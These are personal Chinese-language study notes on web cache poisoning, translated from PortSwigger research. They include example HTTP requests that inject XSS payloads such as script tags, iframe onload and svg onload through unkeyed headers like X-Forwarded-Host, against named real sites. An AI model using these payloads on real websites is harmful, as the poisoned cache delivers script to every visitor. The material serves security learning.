# WEB缓存中毒
> 本文 翻译整理自[实用的web缓存中毒](https://portswigger.net/research/practical-web-cache-poisoning)，记录仅作个人学习使用，侵删
## 核心概念
### Caching 101
Web缓存位于用户和应用程序服务器之间，它们保存和提供某些响应的副本。在下图中，我们可以看到三个用户一个接一个地获取相同的资源：

![](../../网络安全/01.后端漏洞/media/Pasted%20image%2020231003235129.png)

### Cache keys
每当缓存收到一个资源的请求时，它需要决定是否已经保存了这个确切资源的副本，并可以用它来回复请求，还是需要将请求转发给应用服务器。逐字节匹配不现实，这就出现了`缓存键`解决问题~~（通常使用request-line和user-agent作为缓存键）~~
```java
GET /blog/post.php?mobile=1 HTTP/1.1  
Host: example.com  
User-Agent: Mozilla/5.0 … Firefox/57.0  
Cookie: language=pl;  
Connection: close
```

```java
GET /blog/post.php?mobile=1 HTTP/1.1  
Host: example.com  
User-Agent: Mozilla/5.0 … Firefox/57.0  
Cookie: language=en;  
Connection: close
```

在上述请求中，使用了HTTP方法`GET`和主机名`example.com` 以及请求路径`/blog/post.php` 和查询字符串`?mobile=1`来作为缓存建，可想而知，该页面将以错误的语言提供给第二个访问者
>这暗示了一个问题--由非缓存建触发的响应中的任何差异都可能被存储并提供给其他用户

#### 补充：
```
缓存通过使用缓存键（cache keys）的概念来解决这个问题 - 这是 HTTP 请求的一些特定组件，用于完全标识被请求的资源

缓存键通常包括用于唯一标识资源的以下元素：

1. **HTTP方法 (HTTP Method):** 这表示请求的类型，例如 GET、POST、PUT 或 DELETE。

2. **主机名 (Host Name):** 表示请求资源的主机名或域名，用于定位资源的来源。

3. **路径 (Path):** 表示请求资源的路径，即 URL 中主机名之后的部分。

4. **查询字符串 (Query String):** 表示查询参数，如果请求中包含查询参数，它们也会被包括在缓存键中。

```

### Cache Poisoning
Web缓存中毒的目的是发送导致有害响应的请求，这些响应被保存该高速缓存中并提供给其他用户。

![](../../网络安全/01.后端漏洞/media/Pasted%20image%2020231004000647.png)
1. HTTP头等非键控输入
2. HTTP响应拆分
3. 请求走私

### Methodology

![](../../网络安全/01.后端漏洞/media/Pasted%20image%2020231004172422.png)

1. 识别和评估非缓存建输入（Param Miner）
2. 从后端服务器获取有害响应~~(如果一个输入在没有被正确清理的情况下被反映在来自服务器的响应中，或者被用于动态生成其他数据，那么这就是Web缓存中毒的潜在入口点。)~~
3. 使响应缓存~~（是否缓存响应取决于各种因素，例如文件扩展名、内容类型、路由、状态代码和响应头。您可能需要花一些时间来处理不同页面上的请求，并研究该高速缓存的行为。一旦您知道如何缓存包含恶意输入的响应，就可以将漏洞攻击传递给潜在的受害者。）~~

## 实例分析


### XSS
1. 识别和评估非缓存建输入（Param Miner）

![](media/Pasted%20image%2020231006151028.png)  
![](media/Pasted%20image%2020231006151112.png)  
![](media/Pasted%20image%2020231006151134.png)  

2. 从后端服务器获取有害响应
![](media/Pasted%20image%2020231006151220.png)   
在被自己的服务器上 将指向的脚本设为xss攻击脚本
![](media/Pasted%20image%2020231006152652.png)   
![](../../Pasted%20image%2020231006152956.png)  
3. 使响应缓存
X-Cache: hit 响应来自缓存
![](../../Pasted%20image%2020231006153251.png)  


### Basic Poisoning
1. 找非缓存键
```code
GET /en?cb=1 HTTP/1.1  
Host: www.redhat.com  
X-Forwarded-Host:      **canary** 
  
HTTP/1.1 200 OK  
Cache-Control: public, no-cache  
…  
<meta property="og:image" content="https://  **canary **  /cms/social.png" />
```
2. 评估是否可利用
```code
GET /en?dontpoisoneveryone=1 HTTP/1.1  
Host: www.redhat.com  
X-Forwarded-Host:     **a."><script>alert(1)</script> **
  
HTTP/1.1 200 OK  
Cache-Control: public, no-cache  
…  
<meta property="og:image" content="https://   **a."><script>alert(1)</script>**  "/>
```
3. 检查此响应是否已存储在缓存中，以便将其传递给其他用户
```code
GET /en?dontpoisoneveryone=1 HTTP/1.1  
Host: www.redhat.com  
  
HTTP/1.1 200 OK  
…  
<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
```

### Discreet poisoning
1. 发送大量请求保证缓存，方法几乎不可用
2. 逆向目标的缓存到期系统并通过浏览文档和监控网站来预测准确的到期时间来避免这个问题，但这听起来就很难。
3. 响应协议头“Age”和“max-age”分别是当前响应的时间和它将过期的时间
```code
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
…
<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
```


### Selective Poisoning
“Vary” ：赋予的值代表缓存键.
```code
GET / HTTP/1.1  
Host: redacted.com  
User-Agent: Mozilla/5.0 … Firefox/60.0  
X-Forwarded-Host: a"><iframe onload=alert(1)>  
  
HTTP/1.1 200 OK  
X-Served-By: cache-lhr6335-LHR  
Vary: User-Agent, Accept-Encoding  
…  
<link rel="canonical" href="https://a">a<iframe onload=alert(1)>  
</iframe>
```
Vary头告诉我们，我们的User-Agent可能是该高速缓存键的一部分，手动测试证实了这一点。这意味着，由于我们声称使用Firefox 60，我们的漏洞将只提供给其他Firefox 60用户。~~我们可以使用流行的用户代理列表来确保大多数访问者收到我们的漏洞，但这种行为给了我们更多选择性攻击的选择。如果你知道他们的用户代理，你就有可能针对特定的人进行攻击，甚至可以隐藏自己的网站监控团队。~~

### DOM Poisoning
利用未加密的输入并不总是像写入XSS Payload一样容易。如以下请求：

```
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: canary

HTTP/1.1 200 OK
Age: 32707
X-Cache: Hit from cloudfront 
…
<body data-site-root="https://canary/">
```

我们已经控制了'data-site-root'属性，但我们不能突破以使用XSS，并且不清楚这个属性甚至用于什么。为了找到答案，我在Burp中创建了一个匹配并替换的规则，为所有请求添加了“X-Forwarded-Host：id.burpcollaborator.net”协议头，然后浏览了该站点。当加载某些页面时，Firefox会将JavaScript生成的请求发送到我的服务器：

```
GET /api/i18n/en HTTP/1.1
Host: id.burpcollaborator.net
```

该路径表明，在网站的某个地方，有一些JavaScript代码使用data-site-root属性来决定从哪里加载一些国际数据。我试图通过获取[https://catalog.data.gov/api/i18n/en](https://catalog.data.gov/api/i18n/en) 来找出这些数据应该是什么样的，但只是收到了一个空的JSON响应。幸运的是，将'en'改为'es'拿到了一个线索：

```
GET /api/i18n/es HTTP/1.1
Host: catalog.data.gov

HTTP/1.1 200 OK
…
{"Show more":"Mostrar más"}
```

该文件包含用于将短语翻译为用户所选语言的地图。通过创建我们自己的翻译文件并使缓存投毒，我们可以将短语翻译变成漏洞：

```
GET  /api/i18n/en HTTP/1.1
Host: portswigger-labs.net

HTTP/1.1 200 OK
...
{"Show more":"<svg onload=alert(1)>"}
```

最终的结果，任何查看包含“显示更多”文字的网页的人都会被利用。

到此为止 ，更多内容请看paper

### 

## Tools
[Param Miner](https://github.com/PortSwigger/param-miner)
1. Guess header
2. Issue
## Paper
[实用的web缓存中毒](https://portswigger.net/research/practical-web-cache-poisoning)  
[web缓存中毒导致的dos](https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning)  
[**CPDoS**: **C**ache **P**oisoned **D**enial **o**f **S**ervice](https://cpdos.org/)  
[新的web缓存中毒](https://portswigger.net/research/web-cache-entanglement)


# web缓存欺骗